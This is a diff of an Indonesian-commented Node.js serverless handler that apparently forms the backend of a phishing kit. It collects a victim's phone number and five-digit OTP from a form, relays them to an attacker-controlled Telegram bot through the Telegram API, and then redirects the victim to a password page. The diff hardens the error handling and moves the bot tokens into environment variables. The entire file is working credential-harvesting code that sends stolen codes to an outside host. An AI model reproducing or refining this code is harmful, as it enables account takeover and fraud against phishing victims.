@@ -1,14 +1,24 @@
-const fetch = require("node-fetch"); // kalau Node versi lama
+// api/code.js
 
+// Import fetch (kalau Node <18 wajib, kalau Node 18+ sudah built-in)
+let fetchFn;
+try {
+  fetchFn = fetch; // Node 18+ sudah ada global fetch
+} catch {
+  fetchFn = require("node-fetch"); // fallback Node <18
+}
+const fetch = fetchFn;
+
+// Helper untuk parsing body (support JSON & form-urlencoded)
 async function parseBody(req) {
   return new Promise((resolve, reject) => {
-    let body = '';
-    req.on('data', chunk => {
+    let body = "";
+    req.on("data", chunk => {
       body += chunk.toString();
     });
-    req.on('end', () => {
+    req.on("end", () => {
       try {
-        if (req.headers['content-type']?.includes('application/json')) {
+        if (req.headers["content-type"]?.includes("application/json")) {
           resolve(JSON.parse(body));
         } else {
           const params = new URLSearchParams(body);
@@ -22,6 +32,7 @@ async function parseBody(req) {
   });
 }
 
+// Fungsi kirim ke bot Telegram
 async function sendMessage(botToken, chatId, message) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
   const payload = { chat_id: chatId, text: message, parse_mode: "Markdown" };
@@ -30,10 +41,15 @@ async function sendMessage(botToken, chatId, message) {
     const response = await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
+      body: JSON.stringify(payload),
     });
+
     const data = await response.json();
-    return { success: response.ok, data };
+    if (!response.ok || !data.ok) {
+      throw new Error(data.description || "Telegram API error");
+    }
+
+    return { success: true, data };
   } catch (err) {
     console.error("Error sending message:", err);
     return { success: false, error: err.message };
@@ -42,39 +58,49 @@ async function sendMessage(botToken, chatId, message) {
 
 module.exports = async (req, res) => {
   if (req.method !== "POST") {
-    res.status(405).send("Method Not Allowed");
+    res.statusCode = 405;
+    res.end("Method Not Allowed");
     return;
   }
 
+  // Ambil data dari body
   const body = await parseBody(req);
   console.log("Body diterima:", body);
 
   const { phoneNumber, pin1, pin2, pin3, pin4, pin5, bot_id } = body;
-  const pin = `${pin1 || ""}${pin2 || ""}${pin3 || ""}${pin4 || ""}${pin5 || ""}`;
+  const pin = `${pin1 || ""}${pin2 || ""}${pin3 || ""}${pin4 || ""}${pin5 || ""}`.trim();
 
   if (!phoneNumber || !pin) {
-    res.status(400).send("Nomor HP atau OTP tidak ditemukan");
+    res.statusCode = 400;
+    res.end("Nomor HP atau OTP tidak ditemukan");
     return;
   }
 
-  const message = `( OTP | ${phoneNumber} )\n\n- No HP : \`${phoneNumber}\`\n- Code OTP : \`${pin}\` via Telegram`;
+  // Format pesan yang dikirim
+  const message =
+    `( OTP | ${phoneNumber} )\n\n` +
+    `- No HP : \`${phoneNumber}\`\n` +
+    `- Code OTP : \`${pin}\` via Telegram`;
 
+  // Tentukan bot berdasarkan bot_id
   let botToken, chatId;
   if (bot_id === "1") {
-    botToken = "BOT_TOKEN_1";
-    chatId   = "CHAT_ID_1";
+    botToken = process.env.BOT1_TOKEN || "ISI_TOKEN_BOT1";
+    chatId   = process.env.CHAT1_ID   || "ISI_CHATID1";
   } else {
-    botToken = "BOT_TOKEN_2";
-    chatId   = "CHAT_ID_2";
+    botToken = process.env.BOT2_TOKEN || "ISI_TOKEN_BOT2";
+    chatId   = process.env.CHAT2_ID   || "ISI_CHATID2";
   }
 
+  // Kirim ke Telegram
   const result = await sendMessage(botToken, chatId, message);
 
   if (result.success) {
+    console.log("✅ OTP berhasil dikirim:", result.data);
     res.writeHead(302, { Location: "/password/" });
     res.end();
   } else {
-    console.error("Gagal kirim OTP:", result.error, result.data);
+    console.error("❌ Gagal kirim OTP:", result.error);
     res.writeHead(302, { Location: "/otp/" });
     res.end();
   }
